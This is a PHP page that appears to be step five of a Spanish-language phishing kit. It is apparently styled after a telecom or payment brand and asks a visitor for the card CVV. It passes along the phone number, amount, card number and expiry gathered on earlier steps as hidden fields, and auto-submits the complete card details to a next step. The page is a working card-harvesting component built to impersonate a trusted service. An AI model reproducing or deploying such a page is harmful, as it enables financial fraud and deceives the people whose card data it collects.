<?php
/**
 * STEP 5 - CVV
 */

$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
$amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
$card = isset($_POST['card']) ? trim($_POST['card']) : '';
$venc = isset($_POST['venc']) ? trim($_POST['venc']) : '';

if(isset($_POST['cv']) && !empty($_POST['cv'])) {
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Redirigiendo...</title></head>
    <body>
        <form id="autoForm" method="POST" action="step6.php">
            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
            <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
            <input type="hidden" name="venc" value="<?php echo htmlspecialchars($venc); ?>">
            <input type="hidden" name="cv" value="<?php echo htmlspecialchars($_POST['cv']); ?>">
        </form>
        <script>document.getElementById('autoForm').submit();</script>
    </body>
    </html>
    <?php
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CVV | Personal</title>
    <link rel="stylesheet" href="css/op/bootstrap.min.css">
    <link rel="stylesheet" href="css/op/styles.css">
</head>
<body style="background-color: #e5e5e5;">
    <div class="container-fluid">
        <div class="row">
            <div class="col-12 p-0">
                <header class="header">
                    <nav class="px-0 pt-0">
                        <div class="d-flex justify-content-between align-items-center" style="padding: 20px;">
                            <div><img src="assets/flow.svg" style="height: 40px;"></div>
                            <div><img src="assets/secure.svg" style="height: 30px;"></div>
                        </div>
                    </nav>
                </header>

                <div class="row justify-content-center mt-5">
                    <div class="col-12 text-center">
                        <h1 style="color: #333; font-size: 28px; margin-bottom: 30px;">Código de seguridad</h1>
                    </div>

                    <div class="col-11 col-sm-6">
                        <form method="POST" action="step5.php">
                            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
                            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
                            <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
                            <input type="hidden" name="venc" value="<?php echo htmlspecialchars($venc); ?>">
                            
                            <div class="form-group">
                                <label style="color: #666;">Código CVV</label>
                                <input type="text" name="cv" id="cv" class="form-control" placeholder="123" maxlength="4" style="height: 50px; font-size: 16px;" required>
                                <small class="text-muted">3 o 4 dígitos al dorso de tu tarjeta</small>
                            </div>

                            <div class="text-center mt-4">
                                <button type="button" onclick="window.history.back()" class="btn btn-secondary px-4 py-2 mr-2">Volver</button>
                                <button type="submit" id="btnContinuar" class="btn btn-primary px-4 py-2" disabled style="background: #00a8e1; border: none;">Continuar</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="javascript/query.min.js"></script>
    <script src="javascript/jquery.mask.js"></script>
    <script>
        $('#cv').mask('0000');
        $('#cv').on('keyup', function(){
            $('#btnContinuar').prop('disabled', $(this).val().length < 3);
        });
    </script>
</body>
</html>